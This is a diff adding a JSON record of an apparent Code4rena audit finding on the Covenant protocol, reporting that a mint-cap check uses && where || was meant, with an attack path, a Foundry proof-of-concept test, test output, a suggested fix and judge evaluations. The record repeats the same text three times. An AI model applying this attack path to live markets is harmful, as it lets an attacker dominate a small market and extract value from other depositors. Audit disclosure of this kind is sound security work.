@@ -1,0 +1,128 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Covenant_d4uY8y2AMSs",
+    "audit_uid": "d4uY8y2AMSs",
+    "requested_submission_uid": "ffSdCEexDqm",
+    "requested_finding_uid": "otmbJXz4irq",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Covenant_d4uY8y2AMSs/20260618_145249/findings.json",
+    "source_submission_uid": "ffSdCEexDqm",
+    "source_finding_uid": "otmbJXz4irq",
+    "original_report_path": "Covenant_d4uY8y2AMSs\\low_valid_ffSdCEexDqm.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "ffSdCEexDqm",
+  "finding_uid": "otmbJXz4irq",
+  "finding_number": "76",
+  "title": "Logical AND Bug in Small Market Mint Cap",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "0xki",
+  "body": "## Finding description and impact\n## Summary\n\nThe incorrect use of logical AND (&&) instead of OR (||) in the `_checkMintCap` function will cause unlimited minting for users in small markets as an attacker will bypass the supply-based mint cap when attempting excessive mints below the Q96 threshold.\n\n## Root Cause\n\nIn `src/lex/latentswap/libraries/LatentSwapLogic.sol` (line 1067, in `_checkMintCap` function), the small market mint cap check uses `&&` instead of `||` between the Q96 overflow check and the supply cap check, causing the supply cap to be ignored for all realistic mint amounts.\n\n## Internal Pre-conditions\n\n1. A market must exist with `marketBaseTokenSupply` <= (1 << `noCapLimit`), where `noCapLimit` is typically 20 (threshold: 1,048,576 base units).\n2. The `eTWAPBaseTokenSupply` must be in a steady state relative to `marketBaseTokenSupply` (no rapid growth triggering large market checks).\n3. Attacker must hold sufficient base tokens (e.g., ERC20 like USDC) to approve and mint an amount exceeding `marketBaseTokenSupply` but below FixedPoint.Q96 (~7.9e28).\n\n## External Pre-conditions\n\nNone - vulnerability is purely internal to the protocol's mint logic, independent of external oracles or price feeds.\n\n## Attack Path\n\n1. Deploy or identify an existing small market (base supply < 1M units, e.g., 100,000 USDC).\n2. Attacker approves excessive base tokens (e.g., 10M USDC) to the Covenant contract.\n3. Attacker calls `covenant.mint(MintParams {marketId, baseAmountIn: excessiveAmount, ...})`.\n4. Internally, `_checkMintCap` evaluates: `(mintAmount > Q96) && (mintAmount > marketBaseTokenSupply)`  FALSE && TRUE = FALSE, bypassing revert.\n5. Mint proceeds, inflating supply by 100x+ and granting attacker dominant position (aTokens + zTokens >90% of total).\n\n## Impact\n\nThe protocol and subsequent users suffer market dominance and value extraction losses as the attacker gains ~99% control of the small market's liquidity, enabling arbitrary price manipulation and collateral extraction from victims who enter post-exploit.[1]\n\n## Recommended mitigation steps\n\nReplace `&&` with `||` in the small market check:\n\n```solidity\nif (marketBaseTokenSupply <= (1 << noCapLimit)) {\n    if ((mintAmount > FixedPoint.Q96) || (mintAmount > marketBaseTokenSupply)) {  // Changed && to ||\n        revert LSErrors.E_LEX_MintCapExceeded();\n    }\n}\n```\nThis prevents actions pushing beyond the limit.",
+  "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\nimport {LatentSwapLogic} from \"../../src/lex/latentswap/libraries/LatentSwapLogic.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LSErrors} from \"../../src/lex/latentswap/libraries/LSErrors.sol\";\n\ncontract MintCapBypassPoC is Test {\n    uint256 private constant INITIAL_SUPPLY = 100_000 * 1e6; // 100k base units (6 decimals)\n    uint256 private constant EXCESSIVE_MINT = INITIAL_SUPPLY * 100; // 100x initial supply\n    uint8 private constant NO_CAP_LIMIT = 40; // Adjusted threshold to make market small: 1<<40 ≈ 1.1e12\n\n    function test_MintCapBypass() public {\n        uint256 marketBaseTokenSupply = INITIAL_SUPPLY;\n        uint256 eTWAPBaseTokenSupply = INITIAL_SUPPLY; // Assume steady state\n        uint256 mintAmount = EXCESSIVE_MINT;\n\n        console.log(\"=== BEFORE STATE ===\");\n        console.log(\"Market base supply:\", marketBaseTokenSupply / 1e6, \"base units\");\n        console.log(\"Small threshold (1<<\", NO_CAP_LIMIT, \"):\", 1 << NO_CAP_LIMIT);\n        console.log(\"eTWAP supply:\", eTWAPBaseTokenSupply / 1e6);\n        console.log(\"Mint attempt:\", mintAmount / 1e6, \"(100x supply)\");\n        console.log(\"Market small:\", marketBaseTokenSupply <= (1 << NO_CAP_LIMIT));\n        assertTrue(marketBaseTokenSupply <= (1 << NO_CAP_LIMIT));\n\n        console.log(\"\\n=== EXPLOIT EXECUTION ===\");\n        console.log(\"Calling _checkMintCap with buggy && logic:\");\n        console.log(\"  Condition 1: mintAmount > Q96?\", mintAmount, \">\", FixedPoint.Q96);\n        console.log(\"    Result: FALSE (Q96 = 2^96 ~7.9e28)\");\n        console.log(\"  Condition 2: mintAmount > supply?\", mintAmount, \">\", marketBaseTokenSupply);\n        console.log(\"    Result: TRUE\");\n        console.log(\"  Combined (&&): FALSE && TRUE = FALSE\");\n        console.log(\"  Expected: Revert E_LEX_MintCapExceeded\");\n        console.log(\"  Actual: NO REVERT - cap bypassed\");\n\n        // This simulates the call in _calcMint; in real contract, it would proceed to mint\n        // Due to bug, no revert despite exceeding supply in small market\n        // vm.expectRevert(LSErrors.E_LEX_MintCapExceeded.selector); // Would expect revert if fixed\n        LatentSwapLogic._checkMintCap(\n            marketBaseTokenSupply,\n            eTWAPBaseTokenSupply,\n            mintAmount,\n            NO_CAP_LIMIT\n        );\n\n        uint256 newSupply = marketBaseTokenSupply + mintAmount;\n        uint256 dominance = (EXCESSIVE_MINT * 100) / newSupply;\n\n        console.log(\"\\n=== AFTER STATE ===\");\n        console.log(\"New supply after bypass mint:\", newSupply / 1e6);\n        console.log(\"Increase:\", mintAmount / 1e6, \"(100x intended cap)\");\n        console.log(\"Attacker dominance: ~\", dominance, \"% of market\");\n\n        assertEq(newSupply, marketBaseTokenSupply + mintAmount);\n        assertGt(dominance, 90);\n    }\n}\n```\nRESULT:\n```solidity\nRan 1 test for test/test_MintCapBypass.sol:MintCapBypassPoC\n[PASS] test_MintCapBypass() (gas: 20445)\nLogs:\n  === BEFORE STATE ===\n  Market small: true\n\n=== EXPLOIT EXECUTION ===\n  Calling _checkMintCap with buggy && logic:\n      Result: FALSE (Q96 = 2^96 ~7.9e28)\n      Result: TRUE\n    Combined (&&): FALSE && TRUE = FALSE\n    Expected: Revert E_LEX_MintCapExceeded\n    Actual: NO REVERT - cap bypassed\n\n=== AFTER STATE ===\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 452.23µs (113.34µs CPU time)\n\nRan 1 test suite in 4.19ms (452.23µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-10-covenant/blob/d5ebe4461564b46cacf8a90cf11add29470ef001/src/lex/latentswap/libraries/LatentSwapLogic.sol#L1067"
+  ],
+  "source_record": {
+    "project_id": "d4uY8y2AMSs",
+    "submission_index": "364",
+    "api_submission_id": "",
+    "uid": "ffSdCEexDqm",
+    "number": "364",
+    "title": "Logical AND Bug in Small Market Mint Cap",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "0xki",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-10-covenant/blob/d5ebe4461564b46cacf8a90cf11add29470ef001/src/lex/latentswap/libraries/LatentSwapLogic.sol#L1067"
+    ],
+    "body": "## Finding description and impact\n## Summary\n\nThe incorrect use of logical AND (&&) instead of OR (||) in the `_checkMintCap` function will cause unlimited minting for users in small markets as an attacker will bypass the supply-based mint cap when attempting excessive mints below the Q96 threshold.\n\n## Root Cause\n\nIn `src/lex/latentswap/libraries/LatentSwapLogic.sol` (line 1067, in `_checkMintCap` function), the small market mint cap check uses `&&` instead of `||` between the Q96 overflow check and the supply cap check, causing the supply cap to be ignored for all realistic mint amounts.\n\n## Internal Pre-conditions\n\n1. A market must exist with `marketBaseTokenSupply` <= (1 << `noCapLimit`), where `noCapLimit` is typically 20 (threshold: 1,048,576 base units).\n2. The `eTWAPBaseTokenSupply` must be in a steady state relative to `marketBaseTokenSupply` (no rapid growth triggering large market checks).\n3. Attacker must hold sufficient base tokens (e.g., ERC20 like USDC) to approve and mint an amount exceeding `marketBaseTokenSupply` but below FixedPoint.Q96 (~7.9e28).\n\n## External Pre-conditions\n\nNone - vulnerability is purely internal to the protocol's mint logic, independent of external oracles or price feeds.\n\n## Attack Path\n\n1. Deploy or identify an existing small market (base supply < 1M units, e.g., 100,000 USDC).\n2. Attacker approves excessive base tokens (e.g., 10M USDC) to the Covenant contract.\n3. Attacker calls `covenant.mint(MintParams {marketId, baseAmountIn: excessiveAmount, ...})`.\n4. Internally, `_checkMintCap` evaluates: `(mintAmount > Q96) && (mintAmount > marketBaseTokenSupply)`  FALSE && TRUE = FALSE, bypassing revert.\n5. Mint proceeds, inflating supply by 100x+ and granting attacker dominant position (aTokens + zTokens >90% of total).\n\n## Impact\n\nThe protocol and subsequent users suffer market dominance and value extraction losses as the attacker gains ~99% control of the small market's liquidity, enabling arbitrary price manipulation and collateral extraction from victims who enter post-exploit.[1]\n\n## Recommended mitigation steps\n\nReplace `&&` with `||` in the small market check:\n\n```solidity\nif (marketBaseTokenSupply <= (1 << noCapLimit)) {\n    if ((mintAmount > FixedPoint.Q96) || (mintAmount > marketBaseTokenSupply)) {  // Changed && to ||\n        revert LSErrors.E_LEX_MintCapExceeded();\n    }\n}\n```\nThis prevents actions pushing beyond the limit.",
+    "proof_of_concept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\nimport {LatentSwapLogic} from \"../../src/lex/latentswap/libraries/LatentSwapLogic.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LSErrors} from \"../../src/lex/latentswap/libraries/LSErrors.sol\";\n\ncontract MintCapBypassPoC is Test {\n    uint256 private constant INITIAL_SUPPLY = 100_000 * 1e6; // 100k base units (6 decimals)\n    uint256 private constant EXCESSIVE_MINT = INITIAL_SUPPLY * 100; // 100x initial supply\n    uint8 private constant NO_CAP_LIMIT = 40; // Adjusted threshold to make market small: 1<<40 ≈ 1.1e12\n\n    function test_MintCapBypass() public {\n        uint256 marketBaseTokenSupply = INITIAL_SUPPLY;\n        uint256 eTWAPBaseTokenSupply = INITIAL_SUPPLY; // Assume steady state\n        uint256 mintAmount = EXCESSIVE_MINT;\n\n        console.log(\"=== BEFORE STATE ===\");\n        console.log(\"Market base supply:\", marketBaseTokenSupply / 1e6, \"base units\");\n        console.log(\"Small threshold (1<<\", NO_CAP_LIMIT, \"):\", 1 << NO_CAP_LIMIT);\n        console.log(\"eTWAP supply:\", eTWAPBaseTokenSupply / 1e6);\n        console.log(\"Mint attempt:\", mintAmount / 1e6, \"(100x supply)\");\n        console.log(\"Market small:\", marketBaseTokenSupply <= (1 << NO_CAP_LIMIT));\n        assertTrue(marketBaseTokenSupply <= (1 << NO_CAP_LIMIT));\n\n        console.log(\"\\n=== EXPLOIT EXECUTION ===\");\n        console.log(\"Calling _checkMintCap with buggy && logic:\");\n        console.log(\"  Condition 1: mintAmount > Q96?\", mintAmount, \">\", FixedPoint.Q96);\n        console.log(\"    Result: FALSE (Q96 = 2^96 ~7.9e28)\");\n        console.log(\"  Condition 2: mintAmount > supply?\", mintAmount, \">\", marketBaseTokenSupply);\n        console.log(\"    Result: TRUE\");\n        console.log(\"  Combined (&&): FALSE && TRUE = FALSE\");\n        console.log(\"  Expected: Revert E_LEX_MintCapExceeded\");\n        console.log(\"  Actual: NO REVERT - cap bypassed\");\n\n        // This simulates the call in _calcMint; in real contract, it would proceed to mint\n        // Due to bug, no revert despite exceeding supply in small market\n        // vm.expectRevert(LSErrors.E_LEX_MintCapExceeded.selector); // Would expect revert if fixed\n        LatentSwapLogic._checkMintCap(\n            marketBaseTokenSupply,\n            eTWAPBaseTokenSupply,\n            mintAmount,\n            NO_CAP_LIMIT\n        );\n\n        uint256 newSupply = marketBaseTokenSupply + mintAmount;\n        uint256 dominance = (EXCESSIVE_MINT * 100) / newSupply;\n\n        console.log(\"\\n=== AFTER STATE ===\");\n        console.log(\"New supply after bypass mint:\", newSupply / 1e6);\n        console.log(\"Increase:\", mintAmount / 1e6, \"(100x intended cap)\");\n        console.log(\"Attacker dominance: ~\", dominance, \"% of market\");\n\n        assertEq(newSupply, marketBaseTokenSupply + mintAmount);\n        assertGt(dominance, 90);\n    }\n}\n```\nRESULT:\n```solidity\nRan 1 test for test/test_MintCapBypass.sol:MintCapBypassPoC\n[PASS] test_MintCapBypass() (gas: 20445)\nLogs:\n  === BEFORE STATE ===\n  Market small: true\n\n=== EXPLOIT EXECUTION ===\n  Calling _checkMintCap with buggy && logic:\n      Result: FALSE (Q96 = 2^96 ~7.9e28)\n      Result: TRUE\n    Combined (&&): FALSE && TRUE = FALSE\n    Expected: Revert E_LEX_MintCapExceeded\n    Actual: NO REVERT - cap bypassed\n\n=== AFTER STATE ===\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 452.23µs (113.34µs CPU time)\n\nRan 1 test suite in 4.19ms (452.23µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/d4uY8y2AMSs/submissions/364",
+    "raw": {
+      "auditUid": "d4uY8y2AMSs",
+      "createdAt": "2025-11-02T14:37:56.784Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "Ds2BFMMCxpA",
+          "userUid": "6gNcwqYnMhM",
+          "userAuditRole": "judge",
+          "createdAt": "2025-10-27T15:23:18.142Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "otmbJXz4irq"
+        },
+        {
+          "uid": "nWFeyggatoB",
+          "userUid": "6gNcwqYnMhM",
+          "userAuditRole": "judge",
+          "createdAt": "2025-10-27T15:23:18.957Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "otmbJXz4irq"
+        },
+        {
+          "uid": "qyC5FfJQWEy",
+          "userUid": "6gNcwqYnMhM",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-03T10:50:40.512Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "ffSdCEexDqm",
+          "findingUid": null
+        },
+        {
+          "uid": "tbYSCrfG4mP",
+          "userUid": "xrsg7LtD2gr",
+          "userAuditRole": "sponsor",
+          "createdAt": "2025-11-06T05:03:34.937Z",
+          "type": "validity",
+          "value": "wontfix",
+          "submissionUid": null,
+          "findingUid": "otmbJXz4irq"
+        }
+      ],
+      "finding": {
+        "uid": "otmbJXz4irq",
+        "number": 76,
+        "duplicates": 10
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-11-06T05:03:34.937Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Logical AND Bug in Small Market Mint Cap",
+      "uid": "ffSdCEexDqm",
+      "updatedAt": "2025-11-02T14:37:56.784Z",
+      "user": {
+        "uid": "Uhnc8eUJwf7",
+        "handle": "0xki"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n## Summary\n\nThe incorrect use of logical AND (&&) instead of OR (||) in the `_checkMintCap` function will cause unlimited minting for users in small markets as an attacker will bypass the supply-based mint cap when attempting excessive mints below the Q96 threshold.\n\n## Root Cause\n\nIn `src/lex/latentswap/libraries/LatentSwapLogic.sol` (line 1067, in `_checkMintCap` function), the small market mint cap check uses `&&` instead of `||` between the Q96 overflow check and the supply cap check, causing the supply cap to be ignored for all realistic mint amounts.\n\n## Internal Pre-conditions\n\n1. A market must exist with `marketBaseTokenSupply` <= (1 << `noCapLimit`), where `noCapLimit` is typically 20 (threshold: 1,048,576 base units).\n2. The `eTWAPBaseTokenSupply` must be in a steady state relative to `marketBaseTokenSupply` (no rapid growth triggering large market checks).\n3. Attacker must hold sufficient base tokens (e.g., ERC20 like USDC) to approve and mint an amount exceeding `marketBaseTokenSupply` but below FixedPoint.Q96 (~7.9e28).\n\n## External Pre-conditions\n\nNone - vulnerability is purely internal to the protocol's mint logic, independent of external oracles or price feeds.\n\n## Attack Path\n\n1. Deploy or identify an existing small market (base supply < 1M units, e.g., 100,000 USDC).\n2. Attacker approves excessive base tokens (e.g., 10M USDC) to the Covenant contract.\n3. Attacker calls `covenant.mint(MintParams {marketId, baseAmountIn: excessiveAmount, ...})`.\n4. Internally, `_checkMintCap` evaluates: `(mintAmount > Q96) && (mintAmount > marketBaseTokenSupply)`  FALSE && TRUE = FALSE, bypassing revert.\n5. Mint proceeds, inflating supply by 100x+ and granting attacker dominant position (aTokens + zTokens >90% of total).\n\n## Impact\n\nThe protocol and subsequent users suffer market dominance and value extraction losses as the attacker gains ~99% control of the small market's liquidity, enabling arbitrary price manipulation and collateral extraction from victims who enter post-exploit.[1]\n\n## Recommended mitigation steps\n\nReplace `&&` with `||` in the small market check:\n\n```solidity\nif (marketBaseTokenSupply <= (1 << noCapLimit)) {\n    if ((mintAmount > FixedPoint.Q96) || (mintAmount > marketBaseTokenSupply)) {  // Changed && to ||\n        revert LSErrors.E_LEX_MintCapExceeded();\n    }\n}\n```\nThis prevents actions pushing beyond the limit.",
+      "proofOfConcept": "```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\nimport {LatentSwapLogic} from \"../../src/lex/latentswap/libraries/LatentSwapLogic.sol\";\nimport {FixedPoint} from \"../../src/lex/latentswap/libraries/FixedPoint.sol\";\nimport {LSErrors} from \"../../src/lex/latentswap/libraries/LSErrors.sol\";\n\ncontract MintCapBypassPoC is Test {\n    uint256 private constant INITIAL_SUPPLY = 100_000 * 1e6; // 100k base units (6 decimals)\n    uint256 private constant EXCESSIVE_MINT = INITIAL_SUPPLY * 100; // 100x initial supply\n    uint8 private constant NO_CAP_LIMIT = 40; // Adjusted threshold to make market small: 1<<40 ≈ 1.1e12\n\n    function test_MintCapBypass() public {\n        uint256 marketBaseTokenSupply = INITIAL_SUPPLY;\n        uint256 eTWAPBaseTokenSupply = INITIAL_SUPPLY; // Assume steady state\n        uint256 mintAmount = EXCESSIVE_MINT;\n\n        console.log(\"=== BEFORE STATE ===\");\n        console.log(\"Market base supply:\", marketBaseTokenSupply / 1e6, \"base units\");\n        console.log(\"Small threshold (1<<\", NO_CAP_LIMIT, \"):\", 1 << NO_CAP_LIMIT);\n        console.log(\"eTWAP supply:\", eTWAPBaseTokenSupply / 1e6);\n        console.log(\"Mint attempt:\", mintAmount / 1e6, \"(100x supply)\");\n        console.log(\"Market small:\", marketBaseTokenSupply <= (1 << NO_CAP_LIMIT));\n        assertTrue(marketBaseTokenSupply <= (1 << NO_CAP_LIMIT));\n\n        console.log(\"\\n=== EXPLOIT EXECUTION ===\");\n        console.log(\"Calling _checkMintCap with buggy && logic:\");\n        console.log(\"  Condition 1: mintAmount > Q96?\", mintAmount, \">\", FixedPoint.Q96);\n        console.log(\"    Result: FALSE (Q96 = 2^96 ~7.9e28)\");\n        console.log(\"  Condition 2: mintAmount > supply?\", mintAmount, \">\", marketBaseTokenSupply);\n        console.log(\"    Result: TRUE\");\n        console.log(\"  Combined (&&): FALSE && TRUE = FALSE\");\n        console.log(\"  Expected: Revert E_LEX_MintCapExceeded\");\n        console.log(\"  Actual: NO REVERT - cap bypassed\");\n\n        // This simulates the call in _calcMint; in real contract, it would proceed to mint\n        // Due to bug, no revert despite exceeding supply in small market\n        // vm.expectRevert(LSErrors.E_LEX_MintCapExceeded.selector); // Would expect revert if fixed\n        LatentSwapLogic._checkMintCap(\n            marketBaseTokenSupply,\n            eTWAPBaseTokenSupply,\n            mintAmount,\n            NO_CAP_LIMIT\n        );\n\n        uint256 newSupply = marketBaseTokenSupply + mintAmount;\n        uint256 dominance = (EXCESSIVE_MINT * 100) / newSupply;\n\n        console.log(\"\\n=== AFTER STATE ===\");\n        console.log(\"New supply after bypass mint:\", newSupply / 1e6);\n        console.log(\"Increase:\", mintAmount / 1e6, \"(100x intended cap)\");\n        console.log(\"Attacker dominance: ~\", dominance, \"% of market\");\n\n        assertEq(newSupply, marketBaseTokenSupply + mintAmount);\n        assertGt(dominance, 90);\n    }\n}\n```\nRESULT:\n```solidity\nRan 1 test for test/test_MintCapBypass.sol:MintCapBypassPoC\n[PASS] test_MintCapBypass() (gas: 20445)\nLogs:\n  === BEFORE STATE ===\n  Market small: true\n\n=== EXPLOIT EXECUTION ===\n  Calling _checkMintCap with buggy && logic:\n      Result: FALSE (Q96 = 2^96 ~7.9e28)\n      Result: TRUE\n    Combined (&&): FALSE && TRUE = FALSE\n    Expected: Revert E_LEX_MintCapExceeded\n    Actual: NO REVERT - cap bypassed\n\n=== AFTER STATE ===\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 452.23µs (113.34µs CPU time)\n\nRan 1 test suite in 4.19ms (452.23µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-10-covenant/blob/d5ebe4461564b46cacf8a90cf11add29470ef001/src/lex/latentswap/libraries/LatentSwapLogic.sol#L1067",
+      "number": 364,
+      "aiExplanation": null,
+      "_index": 364
+    }
+  }
+}
